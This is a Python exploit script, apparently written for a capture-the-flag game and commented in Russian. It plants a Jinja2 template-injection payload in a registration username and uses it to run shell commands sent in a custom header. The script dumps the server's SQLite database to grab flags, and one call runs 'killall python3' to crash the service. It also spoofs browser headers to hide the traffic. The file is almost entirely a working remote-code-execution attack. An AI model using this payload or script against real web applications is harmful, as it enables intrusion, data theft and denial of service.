import secrets
import requests


# Надо будет сделать чтобы было возможность ввести host
host = "http://127.0.0.1:4242"


def get_flag(host, payload, command):
    
    # Маскировка под обычного пользователя
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "ru,en;q=0.5",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": host,
        "Origin": host,
        "Priority": "u=0, i",
        "Referer": host + "/register.html",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1"
    }


    password_length = 8
    password = secrets.token_urlsafe(password_length)
    username = secrets.token_urlsafe(password_length)
    data = f"username={payload}{username}&password={password}"

    requests.post(host+"/register", data=data, headers=headers)
    response = requests.post(host+"/login", data=data, headers=headers, allow_redirects=False)
    cookie = response.headers.get("set-cookie")
    cookie_dict = dict(item.split("=") for item in cookie.split("; "))


    data = {
        'game_id': 1,
        'score': 1000,
        'time': 10
    }

    requests.post(host+"/score", json=data, cookies=cookie_dict)
    if command != '':
        resp = requests.get(host+"/news.html", headers={"hack": command}, cookies=cookie_dict)
        print(resp.text)
    else:
        resp = requests.get(host+"/news.html", headers={"hack": "strings database.sqlite"}, cookies=cookie_dict)
        flags = resp.text.split("\n")
        flags = [flag for flag in flags if flag.find('=') != -1]

        # И дальше достаёте флаги
        print(flags)

# Payload такой странный, потому что сервер не пропускает кавычки

# Для того чтобы получить флаг
payload = '{{url_for.__globals__.os.popen(request.headers.hack).read()}}'
get_flag(host, payload, command='')

# Для того чтобы положить сервер
payload = '{{url_for.__globals__.os.popen(request.headers.hack).read()}}'
get_flag(host, payload, command="killall python3")
    

